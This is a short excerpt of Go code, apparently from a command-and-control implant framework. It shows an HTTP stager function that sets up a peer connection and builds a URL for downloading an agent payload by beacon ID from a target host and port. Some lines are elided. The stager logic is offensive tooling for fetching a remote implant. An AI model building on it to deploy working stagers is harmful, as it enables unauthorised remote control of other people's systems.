...
func stagerHTTP() {
	...
	hp, err := peers.NewHTTPPeer(profiles.Config)
	if err != nil {
		fmt.Println("[stager] Error creating HTTP peer:", err.Error())
		return
	}
	utils.ParentPeer = hp
	fmt.Println("[stager] Starting HTTP Stager")
	...
	downloadURL := fmt.Sprintf("http://%s:%s/agent/download/%s", TargetIP, TargetPort, beaconID)
